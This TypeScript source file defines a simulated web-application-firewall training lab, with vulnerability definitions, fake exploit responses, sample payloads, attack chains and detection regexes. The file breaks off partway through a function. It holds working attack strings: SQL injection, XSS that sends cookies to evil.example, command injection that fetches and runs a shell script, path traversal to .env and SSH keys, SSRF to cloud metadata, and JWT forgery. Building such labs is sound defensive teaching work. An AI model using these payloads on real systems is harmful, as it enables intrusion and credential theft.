// ============================================================================
// WebGuard — Vulnerability Lab: types, templates, attack chains, simulation
// ============================================================================

import type { HttpMethod, Severity, SandboxResult, TraceStep, RequestLog } from "./types";
import { uid, rand, randInt, shannonEntropy } from "./engine";

// ─── Site Templates ─────────────────────────────────────────────────────────

export type SiteTemplateId = "login" | "contact" | "search" | "api" | "custom";

export interface SiteTemplate {
  id: SiteTemplateId;
  label: string;
  icon: string;
  description: string;
  fields: SiteField[];
}

export interface SiteField {
  id: string;
  label: string;
  type: "text" | "password" | "email" | "textarea" | "select" | "hidden";
  placeholder: string;
  /** Vulnerability IDs this field exposes when vulnerable */
  vulnIds: string[];
  /** Pre-filled demo value */
  defaultValue: string;
}

export const SITE_TEMPLATES: SiteTemplate[] = [
  {
    id: "login",
    label: "Login Portal",
    icon: "🔐",
    description: "Authentication endpoint — vulnerable to credential bypass and SQLi",
    fields: [
      { id: "username", label: "Username", type: "text", placeholder: "admin", vulnIds: ["sqli-login", "brute-force"], defaultValue: "admin" },
      { id: "password", label: "Password", type: "password", placeholder: "Enter password", vulnIds: ["sqli-login", "brute-force"], defaultValue: "password123" },
    ],
  },
  {
    id: "contact",
    label: "Contact Form",
    icon: "📧",
    description: "User submission form — vulnerable to XSS and email injection",
    fields: [
      { id: "name", label: "Name", type: "text", placeholder: "John Doe", vulnIds: ["stored-xss"], defaultValue: "" },
      { id: "email", label: "Email", type: "email", placeholder: "john@example.com", vulnIds: ["email-injection", "stored-xss"], defaultValue: "" },
      { id: "message", label: "Message", type: "textarea", placeholder: "Your message...", vulnIds: ["stored-xss", "open-redirect"], defaultValue: "" },
    ],
  },
  {
    id: "search",
    label: "Search Page",
    icon: "🔍",
    description: "Query endpoint — vulnerable to reflected XSS and SQLi",
    fields: [
      { id: "q", label: "Search Query", type: "text", placeholder: "firewall comparison", vulnIds: ["reflected-xss", "sqli-search"], defaultValue: "" },
      { id: "category", label: "Category", type: "select", placeholder: "", vulnIds: ["sqli-search"], defaultValue: "all" },
    ],
  },
  {
    id: "api",
    label: "API Endpoint",
    icon: "⚡",
    description: "REST API — vulnerable to IDOR, command injection, and SSRF",
    fields: [
      { id: "id", label: "Resource ID", type: "text", placeholder: "42", vulnIds: ["idor", "sqli-api"], defaultValue: "42" },
      { id: "callback", label: "Callback URL", type: "text", placeholder: "https://example.com/hook", vulnIds: ["ssrf", "open-redirect"], defaultValue: "" },
    ],
  },
];

// ─── Vulnerability Definitions ───────────────────────────────────────────────

export type VulnId =
  | "sqli-login" | "sqli-search" | "sqli-api"
  | "reflected-xss" | "stored-xss"
  | "brute-force"
  | "email-injection" | "open-redirect"
  | "idor" | "ssrf" | "cmdi"
  | "path-traversal" | "jwt-forge" | "csrf"
  | "custom";

export interface VulnDef {
  id: VulnId;
  label: string;
  severity: Severity;
  category: string;
  cwe: string;
  owasp: string;
  description: string;
  /** What the attacker gains */
  impact: string;
  /** How WebGuard stops it */
  wafPatch: string;
  /** Fake response when exploit succeeds (WAF OFF) */
  exploitResponse: (payload: string) => { status: number; body: string; evidence: string };
  /** Fake response when WAF blocks */
  blockedResponse: (payload: string) => { status: number; body: string; evidence: string };
  /** Suggested attack payloads */
  samplePayloads: string[];
}

export const VULN_DEFS: Record<VulnId, VulnDef> = {
  "sqli-login": {
    id: "sqli-login",
    label: "SQL Injection (Login Bypass)",
    severity: "critical",
    category: "Injection",
    cwe: "CWE-89",
    owasp: "A03:2021 Injection",
    description: "Login form concatenates user input into SQL query without parameterization, allowing authentication bypass.",
    impact: "Attacker gains admin access without valid credentials. Full database read/write possible.",
    wafPatch: "Virtual patch: OWASP CRS rule 942100 + parameterized query enforcement at the edge",
    exploitResponse: (payload) => ({
      status: 200,
      body: `<!DOCTYPE html>\n<html><head><title>Dashboard</title></head><body>\n<h1>Welcome, admin!</h1>\n<p>Session: sess_${Math.random().toString(36).slice(2, 10)}</p>\n<p>Last login: ${new Date().toLocaleString()}</p>\n<table>\n<tr><td>Role</td><td>Administrator</td></tr>\n<tr><td>Email</td><td>admin@company.com</td></tr>\n<tr><td>API Key</td><td>sk_live_${Math.random().toString(36).slice(2, 18)}</td></tr>\n</table>\n<p style="color:red">⚠ VULNERABILITY EXPLOITED — Authentication bypassed via SQL injection</p>\n</body></html>`,
      evidence: `POST /api/login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n${payload}\n\n→ 200 OK\nSet-Cookie: session=sess_${Math.random().toString(36).slice(2, 10)}; HttpOnly=false\n\n{"success":true,"user":"admin","role":"administrator","token":"eyJhbGci..."}`,
    }),
    blockedResponse: (payload) => ({
      status: 403,
      body: "WebGuard WAF — request blocked (OWASP-CRIT-942100). SQL injection pattern detected and dropped at the edge. No origin contact was made.",
      evidence: `POST /api/login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n${payload}\n\n→ 403 Forbidden\nx-webguard-rule: OWASP-CRIT-942100\nx-webguard-action: blocked\n\nRequest never reached the origin server.`,
    }),
    samplePayloads: [
      "username=admin'--&password=anything",
      "username=' OR '1'='1'--&password=x",
      "username=admin'/*&password=*/OR'1'='1",
      "username=' UNION SELECT 1,2,3--&password=x",
    ],
  },
  "sqli-search": {
    id: "sqli-search",
    label: "SQL Injection (Data Exfiltration)",
    severity: "critical",
    category: "Injection",
    cwe: "CWE-89",
    owasp: "A03:2021 Injection",
    description: "Search query parameter is interpolated into SQL without parameterization, enabling UNION-based data extraction.",
    impact: "Attacker extracts entire database — user records, passwords, payment data, PII.",
    wafPatch: "Virtual patch: parameterized queries + CRS 942100/942110 + input validation at edge",
    exploitResponse: (payload) => ({
      status: 200,
      body: `<!DOCTYPE html>\n<html><head><title>Search Results</title></head><body>\n<h1>Search Results for '${payload.split("=")[1]?.slice(0, 30) || "payload"}'</h1>\n<table border="1">\n<tr><th>id</th><th>username</th><th>password_hash</th><th>email</th></tr>\n<tr><td>1</td><td>admin</td><td>$2b$12$LJ3m4...</td><td>admin@company.com</td></tr>\n<tr><td>2</td><td>jsmith</td><td>$2b$12$kR9x...</td><td>jsmith@company.com</td></tr>\n<tr><td>3</td><td>arahman</td><td>$2b$12$pQ4...</td><td>arahman@company.com</td></tr>\n</table>\n<p style="color:red">⚠ VULNERABILITY EXPLOITED — Database rows leaked via UNION injection</p>\n</body></html>`,
      evidence: `GET /api/search?q=' UNION SELECT id,username,password_hash,email FROM users-- HTTP/1.1\n\n→ 200 OK\n\n3 rows returned from information_schema injection:\nusers.id | users.username | users.password_hash | users.email`,
    }),
    blockedResponse: (payload) => ({
      status: 403,
      body: "WebGuard WAF — request blocked (OWASP-CRIT-942100). UNION-based injection pattern detected.",
      evidence: `GET /api/search?q=${encodeURIComponent(payload.split("=")[1] || "")} HTTP/1.1\n\n→ 403 Forbidden\nx-webguard-rule: OWASP-CRIT-942100`,
    }),
    samplePayloads: [
      "q=' OR 1=1--",
      "q=' UNION SELECT username,password FROM users--",
      "q=' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
      "q=' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables--",
    ],
  },
  "sqli-api": {
    id: "sqli-api",
    label: "SQL Injection (API Parameter)",
    severity: "critical",
    category: "Injection",
    cwe: "CWE-89",
    owasp: "A03:2021 Injection",
    description: "API resource ID parameter is concatenated into SQL, allowing blind injection and data extraction.",
    impact: "Full database compromise via blind extraction — one row at a time.",
    wafPatch: "Virtual patch: CRS 942100 + input validation (^[0-9]+$) at edge",
    exploitResponse: (payload) => ({
      status: 200,
      body: `{"data":{"id":1,"name":"Admin Account","email":"admin@company.com","api_key":"sk_live_AbCdEfGhIjKlMnOpQrStUvWx","role":"superadmin","notes":"Default credentials: admin/changeme123"}}`,
      evidence: `GET /api/users?id=1 AND 1=1 UNION SELECT 1,name,email,api_key,role,notes FROM users LIMIT 1--\n\n→ 200 OK\nFull user record including API key and superadmin role.`,
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked (OWASP-CRIT-942100). Blind injection detected in query parameter.",
      evidence: "→ 403 Forbidden\nx-webguard-rule: OWASP-CRIT-942100",
    }),
    samplePayloads: [
      "id=1 AND 1=1",
      "id=1' AND '1'='1",
      "id=1 AND sleep(5)",
      "id=1 UNION SELECT NULL,NULL,NULL--",
    ],
  },
  "reflected-xss": {
    id: "reflected-xss",
    label: "Reflected Cross-Site Scripting",
    severity: "high",
    category: "Cross-Site Scripting",
    cwe: "CWE-79",
    owasp: "A03:2021 Injection",
    description: "Search query is echoed into HTML response without encoding, allowing script injection.",
    impact: "Attacker steals session cookies, keystrokes, and performs actions as any user who clicks the link.",
    wafPatch: "Virtual patch: CRS 941100 + context-aware output encoding at edge",
    exploitResponse: (payload) => {
      const script = payload.split("=")[1] || "<script>alert(1)</script>";
      return {
        status: 200,
        body: `<!DOCTYPE html>\n<html><head><title>Search Results</title></head><body>\n<h1>Search results for: ${script}</h1>\n<p>Showing results for "${script}"...</p>\n<div id="results">No results found.</div>\n<p style="color:red">⚠ VULNERABILITY EXPLOITED — Script reflected in page context</p>\n<script>/* Attacker script would execute here: */\n// document.location='https://evil.example/steal?c='+document.cookie</script>\n</body></html>`,
        evidence: `GET /search?q=${encodeURIComponent(script)} HTTP/1.1\n\n→ 200 OK\nContent-Type: text/html\n\n<h1>Search results for: ${script}</h1>\n\nPayload echoed directly into DOM without encoding.`,
      };
    },
    blockedResponse: (payload) => ({
      status: 403,
      body: "WebGuard WAF — request blocked (OWASP-CRIT-941100). Reflected XSS payload detected.",
      evidence: `GET /search?q=${encodeURIComponent(payload.split("=")[1] || "")} HTTP/1.1\n\n→ 403 Forbidden\nx-webguard-rule: OWASP-CRIT-941100`,
    }),
    samplePayloads: [
      "q=<script>alert(document.cookie)</script>",
      "q=<img src=x onerror=alert(1)>",
      "q=<svg/onload=alert(document.domain)>",
      "q=%3Cscript%3Efetch('https://evil.example/steal?c='+document.cookie)%3C/script%3E",
    ],
  },
  "stored-xss": {
    id: "stored-xss",
    label: "Stored Cross-Site Scripting",
    severity: "high",
    category: "Cross-Site Scripting",
    cwe: "CWE-79",
    owasp: "A03:2021 Injection",
    description: "User input stored in database and rendered to all visitors without sanitization.",
    impact: "Persistent attack — every user viewing the page is compromised. Wormable.",
    wafPatch: "Virtual patch: output encoding + CSP header injection at edge",
    exploitResponse: (payload) => ({
      status: 200,
      body: `{"success":true,"message":"Your submission has been saved.","id":${randInt(1000, 9999)}}\n\n<!-- When other users view this page, the stored XSS executes in their browser -->\n<!-- <script>fetch('https://evil.example/collect?session='+document.cookie)</script> -->`,
      evidence: `POST /api/contact HTTP/1.1\nContent-Type: application/json\n\n${payload}\n\n→ 200 OK\nPayload stored in database. Executes for every user who views the contact page.`,
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked (OWASP-CRIT-941100). Stored XSS payload detected in request body.",
      evidence: "→ 403 Forbidden\nx-webguard-rule: OWASP-CRIT-941100\nx-webguard-detail: Script tag in POST body",
    }),
    samplePayloads: [
      'name=<script>alert("XSS")</script>&email=a@b.com&message=test',
      "name=<img src=x onerror=alert(1)>&email=a@b.com&message=Hi",
      'name=</title><script>fetch("https://evil.example/"+document.cookie)</script>&email=a@b.com&message=',
    ],
  },
  "brute-force": {
    id: "brute-force",
    label: "Credential Brute Force",
    severity: "high",
    category: "Broken Access Control",
    cwe: "CWE-307",
    owasp: "A07:2021 Authentication Failures",
    description: "No rate limiting on login endpoint allows unlimited password attempts.",
    impact: "Weak passwords cracked in minutes. Account takeover via credential stuffing.",
    wafPatch: "Virtual patch: 10 req/min per IP + progressive lockout + CAPTCHA escalation",
    exploitResponse: (payload) => ({
      status: 200,
      body: `{"success":true,"message":"Login successful","token":"eyJhbGci...${randInt(1000, 9999)}"}`,
      evidence: `POST /api/login HTTP/1.1\n${payload}\n\n→ 200 OK (attempt #${randInt(50, 500)})\n\nNo rate limit headers present. No lockout after ${randInt(50, 500)} failed attempts.`,
    }),
    blockedResponse: () => ({
      status: 429,
      body: "Rate limit exceeded — retry after 60 seconds. Too many failed login attempts from this IP.",
      evidence: `→ 429 Too Many Requests\nRetry-After: 60\nX-RateLimit-Limit: 10\nX-RateLimit-Remaining: 0\nX-RateLimit-Reset: ${Math.floor(Date.now() / 1000 + 60)}`,
    }),
    samplePayloads: [
      "username=admin&password=password123",
      "username=admin&password=123456",
      "username=admin&password=admin",
      "username=admin&password=qwerty",
    ],
  },
  "email-injection": {
    id: "email-injection",
    label: "Email Header Injection",
    severity: "medium",
    category: "Injection",
    cwe: "CWE-74",
    owasp: "A03:2021 Injection",
    description: "Email field accepts newline characters allowing SMTP header injection.",
    impact: "Attacker sends spam, phishes other users, or bypasses email-based security controls.",
    wafPatch: "Virtual patch: input validation + CRLF stripping at edge",
    exploitResponse: (payload) => ({
      status: 200,
      body: '{"success":true,"message":"Email sent to recipient"}',
      evidence: `POST /api/contact HTTP/1.1\n${payload}\n\n→ 200 OK\n\nSMTP headers injected:\nTo: admin@company.com\nSubject: Urgent\nBcc: spam@external.example\n\nAttacker can now send arbitrary emails through this form.`,
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked. Email injection pattern (CRLF) detected in field value.",
      evidence: "→ 403 Forbidden\nx-webguard-detail: CRLF injection in email field",
    }),
    samplePayloads: [
      "email=test@example.com%0ABcc:spam@external.example",
      "email=test@example.com%0D%0ASubject:Hacked",
    ],
  },
  "open-redirect": {
    id: "open-redirect",
    label: "Open Redirect",
    severity: "medium",
    category: "Broken Access Control",
    cwe: "CWE-601",
    owasp: "A01:2021 Broken Access Control",
    description: "Redirect parameter accepts arbitrary URLs, enabling phishing and OAuth token theft.",
    impact: "Phishing attacks bypass URL-based security. OAuth/JWT tokens stolen via malicious redirect.",
    wafPatch: "Virtual patch: redirect allowlist validation at edge",
    exploitResponse: () => ({
      status: 302,
      body: "Redirecting to: https://evil-lookalike.example/login",
      evidence: "HTTP/1.1 302 Found\nLocation: https://evil-lookalike.example/login\n\nUser redirected to attacker-controlled phishing page that mimics the real login.",
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked. Redirect target not in allowlist.",
      evidence: "→ 403 Forbidden\nx-webguard-detail: Open redirect blocked — target not in domain allowlist",
    }),
    samplePayloads: [
      "callback=https://evil.example.com/steal",
      "redirect=https://evil-lookalike.example.com/login",
      "return_to=//evil.example.com/phish",
    ],
  },
  idor: {
    id: "idor",
    label: "Insecure Direct Object Reference",
    severity: "high",
    category: "Broken Access Control",
    cwe: "CWE-639",
    owasp: "A01:2021 Broken Access Control",
    description: "Resource ID is accepted without ownership verification — any user can access any record.",
    impact: "Attacker enumerates IDs to access other users' private data, payments, and PII.",
    wafPatch: "Virtual patch: session-bound authorization check at edge",
    exploitResponse: (payload) => ({
      status: 200,
      body: `{"id":${randInt(1, 100)},"name":"Jane Doe","email":"jane.doe@company.com","ssn":"***-**-${randInt(1000, 9999)}","salary":${randInt(80000, 150000)},"bank_account":"****${randInt(1000, 9999)}"}`,
      evidence: `GET /api/users/${payload.split("=")[1] || "1337"} HTTP/1.1\n\n→ 200 OK\n\nRecord belongs to user_id=55 but request is from user_id=12.\nNo ownership check was performed.`,
    }),
    blockedResponse: () => ({
      status: 403,
      body: "Forbidden — you do not have access to this resource.",
      evidence: "→ 403 Forbidden\nx-webguard-detail: IDOR blocked — session authorization check failed",
    }),
    samplePayloads: ["id=1", "id=1337", "id=0", "id=999"],
  },
  ssrf: {
    id: "ssrf",
    label: "Server-Side Request Forgery",
    severity: "critical",
    category: "Server-Side Request Forgery",
    cwe: "CWE-918",
    owasp: "A10:2021 SSRF",
    description: "Callback URL is fetched by the server without validation, allowing internal network access.",
    impact: "Attacker accesses internal services (metadata, databases, admin panels) from the server's network.",
    wafPatch: "Virtual patch: URL scheme allowlist + internal IP blocklist at edge",
    exploitResponse: () => ({
      status: 200,
      body: '{"instance_id":"i-0a1b2c3d4e5f6g7h8","iam_role":"admin","ami_id":"ami-12345678","user_data":"base64..."}',
      evidence: `POST /api/ping HTTP/1.1\n\ncallback=http://169.254.169.254/latest/meta-data/\n\n→ 200 OK\n\nServer fetched AWS metadata endpoint:\nhttp://169.254.169.254/latest/meta-data/\n\nCloud credentials and instance metadata exposed.`,
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked. SSRF detected: internal/private IP target.",
      evidence: "→ 403 Forbidden\nx-webguard-detail: SSRF blocked — target resolves to private CIDR (169.254.0.0/16)",
    }),
    samplePayloads: [
      "callback=http://169.254.169.254/latest/meta-data/",
      "callback=http://127.0.0.1:6379/",
      "callback=http://localhost:3000/admin",
    ],
  },
  cmdi: {
    id: "cmdi",
    label: "OS Command Injection",
    severity: "critical",
    category: "Injection",
    cwe: "CWE-78",
    owasp: "A03:2021 Injection",
    description: "User input is passed to system shell, allowing arbitrary command execution.",
    impact: "Full server compromise — read files, install backdoors, pivot to internal network.",
    wafPatch: "Virtual patch: CRS 932160 + shell metacharacter blocking at edge",
    exploitResponse: (payload) => ({
      status: 200,
      body: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:Admin,,,:/home/admin:/bin/bash\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)`,
      evidence: `POST /api/ping HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n${payload}\n\n→ 200 OK\n\nCommand executed: cat /etc/passwd\n\nFull /etc/passwd returned — server is fully compromised.`,
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked (OWASP-CRIT-932160). Shell metacharacters detected.",
      evidence: "→ 403 Forbidden\nx-webguard-rule: OWASP-CRIT-932160\nx-webguard-detail: Command injection blocked",
    }),
    samplePayloads: [
      "host=8.8.8.8;cat /etc/passwd",
      "host=`id`",
      "host=127.0.0.1|whoami",
      "host=$(curl http://evil.example/shell.sh|bash)",
    ],
  },
  "path-traversal": {
    id: "path-traversal",
    label: "Path Traversal",
    severity: "high",
    category: "Path Traversal",
    cwe: "CWE-22",
    owasp: "A01:2021 Broken Access Control",
    description: "File parameter allows directory traversal sequences to access arbitrary server files.",
    impact: "Attacker reads sensitive server files — /etc/passwd, config files, application source code.",
    wafPatch: "Virtual patch: CRS 930120 + path canonicalization at edge",
    exploitResponse: () => ({
      status: 200,
      body: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
      evidence: "GET /api/download?file=../../../../etc/passwd HTTP/1.1\n\n→ 200 OK\n\n/etc/passwd contents returned — filesystem traversal successful.",
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked (OWASP-CRIT-930120). Path traversal detected.",
      evidence: "→ 403 Forbidden\nx-webguard-rule: OWASP-CRIT-930120",
    }),
    samplePayloads: [
      "file=../../../../etc/passwd",
      "file=..%2F..%2F..%2Fetc%2Fpasswd",
      "file=....//....//etc/passwd",
    ],
  },
  "jwt-forge": {
    id: "jwt-forge",
    label: "JWT Token Forgery",
    severity: "critical",
    category: "Cryptographic Failures",
    cwe: "CWE-347",
    owasp: "A02:2021 Cryptographic Failures",
    description: "JWT tokens signed with weak/none algorithm can be forged to impersonate any user.",
    impact: "Full authentication bypass — attacker becomes any user, including admin.",
    wafPatch: "Virtual patch: JWT algorithm validation + signature verification at edge",
    exploitResponse: () => ({
      status: 200,
      body: `{"id":1,"name":"admin","role":"superadmin","iat":${Math.floor(Date.now() / 1000)},"exp":${Math.floor(Date.now() / 1000 + 86400)}}`,
      evidence: `Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.\n\n→ 200 OK\n\nJWT forged with algorithm "none" — no signature verification performed.\nAttacker escalated to superadmin.`,
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked. JWT algorithm 'none' not allowed.",
      evidence: "→ 403 Forbidden\nx-webguard-detail: JWT forgery blocked — algorithm 'none' rejected",
    }),
    samplePayloads: [
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid",
    ],
  },
  csrf: {
    id: "csrf",
    label: "Cross-Site Request Forgery",
    severity: "medium",
    category: "Broken Access Control",
    cwe: "CWE-352",
    owasp: "A01:2021 Broken Access Control",
    description: "State-changing operations accept requests without CSRF token validation.",
    impact: "Attacker tricks users into performing unwanted actions (change email, delete account, transfer funds).",
    wafPatch: "Virtual patch: CSRF token enforcement + SameSite cookie validation at edge",
    exploitResponse: () => ({
      status: 200,
      body: '{"success":true,"message":"Email changed to attacker@evil.com"}',
      evidence: "POST /api/settings HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker@evil.com\n\n→ 200 OK\nNo CSRF token checked. Email changed via cross-site form submission.",
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked. Missing or invalid CSRF token.",
      evidence: "→ 403 Forbidden\nx-webguard-detail: CSRF token validation failed",
    }),
    samplePayloads: [
      "email=attacker@evil.com (cross-origin form POST)",
    ],
  },
  custom: {
    id: "custom",
    label: "Custom Vulnerability",
    severity: "medium",
    category: "Custom",
    cwe: "CWE-0",
    owasp: "Custom Rule",
    description: "User-defined vulnerability for testing custom attack scenarios.",
    impact: "Depends on custom configuration.",
    wafPatch: "Custom virtual patch configured by user",
    exploitResponse: () => ({
      status: 200,
      body: '{"result":"custom vulnerability exploited"}',
      evidence: "Custom vulnerability exploited with user-defined payload.",
    }),
    blockedResponse: () => ({
      status: 403,
      body: "WebGuard WAF — request blocked. Custom rule triggered.",
      evidence: "→ 403 Forbidden\nx-webguard-rule: CUSTOM",
    }),
    samplePayloads: ["custom payload here"],
  },
};

// ─── Attack Chains ──────────────────────────────────────────────────────────

export interface AttackChainStep {
  vulnId: VulnId;
  payload: string;
  description: string;
}

export interface AttackChain {
  id: string;
  name: string;
  tagline: string;
  severity: Severity;
  difficulty: "beginner" | "intermediate" | "advanced";
  icon: string;
  steps: AttackChainStep[];
  /** What the attacker ultimately achieves */
  finalImpact: string;
}

export const ATTACK_CHAINS: AttackChain[] = [
  {
    id: "sqli-to-rce",
    name: "SQLi → Remote Code Execution",
    tagline: "Extract DB credentials → pivot to OS command execution",
    severity: "critical",
    difficulty: "advanced",
    icon: "💥",
    steps: [
      { vulnId: "sqli-search", payload: "q=' UNION SELECT username,password_hash FROM users WHERE username='admin'--", description: "Step 1: Extract admin password hash from database via UNION injection" },
      { vulnId: "sqli-api", payload: "id=1 UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--", description: "Step 2: Use SQL FILE_READ privilege to read server files" },
      { vulnId: "cmdi", payload: "host=8.8.8.8;mysql -u admin -p'hacked' -e 'SELECT INTO OUTFILE /var/www/html/shell.php}'", description: "Step 3: Use database write privilege to deploy webshell" },
      { vulnId: "cmdi", payload: "host=8.8.8.8;curl http://evil.example/shell.sh|bash", description: "Step 4: Execute reverse shell from deployed webshell — full server compromise" },
    ],
    finalImpact: "Complete server takeover — database dumped, webshell deployed, reverse shell established. Attacker has persistent access.",
  },
  {
    id: "xss-session-hijack",
    name: "XSS → Session Hijacking",
    tagline: "Inject script → steal session → impersonate user → access admin panel",
    severity: "critical",
    difficulty: "intermediate",
    icon: "🎭",
    steps: [
      { vulnId: "reflected-xss", payload: "q=<script>fetch('https://evil.example/steal?c='+document.cookie)</script>", description: "Step 1: Inject reflected XSS that exfiltrates session cookie to attacker server" },
      { vulnId: "stored-xss", payload: "name=<script>new Image().src='https://evil.example/log?cookie='+document.cookie</script>&email=a@b.com&message=", description: "Step 2: Store persistent XSS in contact form — every visitor's session is stolen" },
      { vulnId: "idor", payload: "id=1", description: "Step 3: Use stolen session cookie to access other users' data via IDOR" },
      { vulnId: "jwt-forge", payload: "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.", description: "Step 4: Forge admin JWT to gain persistent admin access" },
    ],
    finalImpact: "All users' sessions compromised. Admin panel accessed. Persistent backdoor via forged JWT tokens.",
  },
  {
    id: "ssrf-pivot",
    name: "SSRF → Internal Network Pivot",
    tagline: "Exploit callback → scan internal network → access cloud metadata",
    severity: "critical",
    difficulty: "advanced",
    icon: "🌐",
    steps: [
      { vulnId: "ssrf", payload: "callback=http://169.254.169.254/latest/meta-data/", description: "Step 1: Use SSRF to access cloud instance metadata — get IAM credentials" },
      { vulnId: "ssrf", payload: "callback=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role", description: "Step 2: Fetch IAM role credentials from metadata endpoint" },
      { vulnId: "ssrf", payload: "callback=http://internal-db.local:3306/", description: "Step 3: Pivot to internal database server via SSRF" },
      { vulnId: "ssrf", payload: "callback=http://internal-admin.local:8080/admin/config", description: "Step 4: Access internal admin panel — extract all secrets and keys" },
    ],
    finalImpact: "Cloud credentials compromised. Internal network fully mapped and accessible. All secrets and data exfiltrated.",
  },
  {
    id: "credential-stuffing-cascade",
    name: "Brute Force → Lateral Movement",
    tagline: "Crack password → escalate privileges → access all accounts",
    severity: "high",
    difficulty: "intermediate",
    icon: "🔑",
    steps: [
      { vulnId: "brute-force", payload: "username=admin&password=password123", description: "Step 1: Brute force login — crack weak password in minutes" },
      { vulnId: "idor", payload: "id=1337", description: "Step 2: Use admin access to enumerate all user IDs and extract PII" },
      { vulnId: "open-redirect", payload: "callback=https://evil-lookalike.example.com/phish", description: "Step 3: Craft phishing links using open redirect to steal more credentials" },
      { vulnId: "jwt-forge", payload: "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.", description: "Step 4: Forge permanent admin access token" },
    ],
    finalImpact: "Admin account compromised. All user PII extracted. Phishing campaign launched. Persistent admin backdoor installed.",
  },
  {
    id: "data-exfil-chain",
    name: "SQLi → Data Exfiltration → CSRF",
    tagline: "Map database → extract sensitive data → modify records",
    severity: "critical",
    difficulty: "intermediate",
    icon: "📦",
    steps: [
      { vulnId: "sqli-search", payload: "q=' UNION SELECT table_name,NULL FROM information_schema.tables--", description: "Step 1: Enumerate database tables via information_schema" },
      { vulnId: "sqli-api", payload: "id=1 UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--", description: "Step 2: Map all columns in the users table" },
      { vulnId: "sqli-search", payload: "q=' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password_hash) FROM users--", description: "Step 3: Dump all usernames and password hashes" },
      { vulnId: "csrf", payload: "email=admin@attacker.com&transfer_to=attacker&amount=999999", description: "Step 4: Modify payment records via CSRF while authenticated" },
    ],
    finalImpact: "Complete database dump — all users, passwords, PII. Financial records modified. Data integrity compromised.",
  },
  {
    id: "path-traversal-chain",
    name: "Path Traversal → Config Leak → Full Compromise",
    tagline: "Read server files → extract secrets → gain admin access",
    severity: "critical",
    difficulty: "beginner",
    icon: "📁",
    steps: [
      { vulnId: "path-traversal", payload: "file=../../../../etc/passwd", description: "Step 1: Read /etc/passwd — enumerate system users" },
      { vulnId: "path-traversal", payload: "file=../../../../var/www/html/.env", description: "Step 2: Read .env file — extract database credentials and API keys" },
      { vulnId: "sqli-login", payload: "username=root'--&password=x", description: "Step 3: Use extracted DB credentials to bypass authentication" },
      { vulnId: "cmdi", payload: "host=8.8.8.8;cat /root/.ssh/id_rsa", description: "Step 4: Read SSH private keys — pivot to other servers" },
    ],
    finalImpact: "Server files read. Database credentials extracted. SSH keys compromised. Lateral movement to other infrastructure.",
  },
];

// ─── Simulation Engine ──────────────────────────────────────────────────────

export interface LabSiteConfig {
  templateId: SiteTemplateId;
  enabledVulns: VulnId[];
  /** For custom vulns */
  customVulnName: string;
  customVulnPayload: string;
  customVulnSeverity: Severity;
  /** Field values entered by user */
  fieldValues: Record<string, string>;
}

export interface LabAttackResult {
  id: string;
  ts: number;
  vulnId: VulnId;
  payload: string;
  wafOn: boolean;
  request: { method: HttpMethod; path: string; headers: Record<string, string>; body: string };
  response: { status: number; headers: Record<string, string>; body: string };
  evidence: string;
  blocked: boolean;
  threatScore: number;
  chainId?: string;
  chainStep?: number;
}

/** Determine if a payload would match a specific vulnerability */
function payloadMatchesVuln(payload: string, vulnId: VulnId): boolean {
  const p = payload.toLowerCase();
  switch (vulnId) {
    case "sqli-login":
    case "sqli-search":
    case "sqli-api":
      return /union|select|or\s+1\s*=\s*1|'\s*or\s*'|--|;\s*drop|extractvalue|sleep\(/i.test(p);
    case "reflected-xss":
    case "stored-xss":
      return /<script|onerror|onload|javascript:|<img|<svg|<iframe|document\.cookie|document\.domain/i.test(p);
    case "brute-force":
      return /password=|pass=|pwd=/i.test(p);
    case "email-injection":
      return /%0d%0a|%0a|bcc:|cc:|subject:/i.test(p);
    case "open-redirect":
      return /redirect|callback|return_to|return_url|next=/i.test(p);
    case "idor":
      return /id=\d+/i.test(p);
    case "ssrf":
      return /169\.254|127\.0\.0\.1|localhost|callback|internal/i.test(p);
    case "cmdi":
      return /;|`|\|.*\||\$\(.*\)|cat\s|whoami|id$|bash/i.test(p);
    case "path-traversal":
      return /\.\.\//.test(p) || /%2e%2e/i.test(p);
    case "jwt-forge":
      return /eyJ.*ey.*\./.test(p);
    case "csrf":
      return /email=|transfer|change/i.test(p);
    default:
      return false;
  }
}

export function runLabAttack(
  config: LabSiteConfig,
  payload: string,
  method: HttpMethod,
  path: string,
  wafOn: boolean,
  chainId?: string,
  chainStep?: number,
): LabAttackResult {
  // Find matching vulnerability
